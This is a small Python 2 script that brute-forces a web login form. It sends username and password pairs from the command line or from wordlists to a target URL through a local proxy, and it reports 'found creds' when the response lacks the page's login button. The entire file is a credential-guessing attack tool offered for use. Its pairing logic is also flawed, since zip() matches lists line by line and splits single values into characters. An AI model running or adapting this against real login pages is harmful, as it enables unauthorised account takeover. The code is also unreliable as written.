import urllib3
import sys
from optparse import OptionParser


Usage = "\nUsage: %s <target login url> <GET/POST> -u/-U <username/username-list> -p/-P <password/password-list>\n"%sys.argv[0]
if len(sys.argv) !=7:
	print Usage
	sys.exit()

target = sys.argv[1]
method = sys.argv[2].upper()

#deal with username args
if sys.argv[3] == '-u':
	username = sys.argv[4]
elif sys.argv[3] == '-U':
	username=[]
	for i in open(sys.argv[4],'r').readlines():
		username.append(i.rstrip())
else:
	print Usage

#deal with password args
if sys.argv[5] == '-p':
	password = sys.argv[6]
elif sys.argv[5] == '-P':
	password=[]
	for i in open(sys.argv[6],'r').readlines():
		password.append(i.rstrip())
else:
	print Usage


stream=urllib3.ProxyManager("http://127.0.0.1:8080/")
#stream=urllib3.PoolManager()
for i, (u,p) in enumerate(zip(username,password)):
	req=stream.request(method,target,fields={'username':u,'password':p})
	print req.status
	if '<td><input type="submit" name="submit" value="Log In" class="button"></td>' in req.data:  # put some test string here from response. 
		print '[!] Wrong creds'
	else:
		print '[!] found creds--> %s:%s'%(u,p)
	#print stream.headers


### 0x10w1eve1 ###
